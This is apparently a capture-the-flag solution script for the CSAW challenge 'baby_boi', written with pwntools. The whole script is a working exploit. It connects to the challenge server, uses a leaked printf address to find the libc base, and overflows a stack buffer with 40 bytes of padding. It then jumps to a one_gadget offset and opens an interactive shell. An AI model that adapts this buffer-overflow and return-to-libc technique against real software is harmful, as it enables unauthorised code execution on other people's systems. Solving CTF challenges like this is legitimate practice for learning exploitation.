from pwn import *

libc = ELF("./libc.so.6")
e = ELF("./baby_boi")
p = remote("pwn.chal.csaw.io", 1005)
#p = process(e.path)

p.recvuntil("0x")
leak = int(p.recvline(), 16) - libc.symbols["printf"]

print("{:#x}".format(leak))

#gdb.attach(p)
p.sendline("A" * 32 + "A" * 8 + p64(leak + 0x4f2c5))

p.interactive()
